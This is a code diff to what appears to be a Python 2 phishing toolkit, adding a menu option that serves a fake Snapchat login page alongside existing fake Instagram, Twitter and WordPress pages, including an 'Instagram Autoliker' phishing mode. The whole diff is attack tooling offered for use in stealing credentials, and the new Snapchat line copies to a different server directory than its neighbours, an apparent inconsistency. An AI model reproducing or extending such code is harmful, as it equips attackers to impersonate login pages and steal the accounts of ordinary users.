@@ -97,6 +97,8 @@ def runPhishing(social, option2):
         system('cp WebPagesTermux/wordpress/*.* ServerTermux/www/')
     elif social == 'Twitter':
         system('cp WebPagesTermux/twitter/*.* ServerTermux/www/')
+    elif social == 'Snapchat':
+        system('cp WebPagesTermux/Snapchat_web/*.* Server/www/')	
     elif option2 == '1' and social == 'Instagram':
         system('cp WebPagesTermux/Instagram_web/*.* ServerTermux/www/')
     elif option2 == '2' and social == 'Instagram':
@@ -193,7 +195,11 @@ def runPEnv():
     elif option == '8':
         loadModule('Instagram')
         option2 =raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n  {0}SF-An0nUD4Y > {1}".format(CYAN, END))
-        runPhishing('Instagram', option2)    
+        runPhishing('Instagram', option2)
+    elif option == '9':
+        loadModule('Snapchat')
+        option2 = ''
+        runPhishing('Snapchat', option2)
     else:
         exit(0)
 
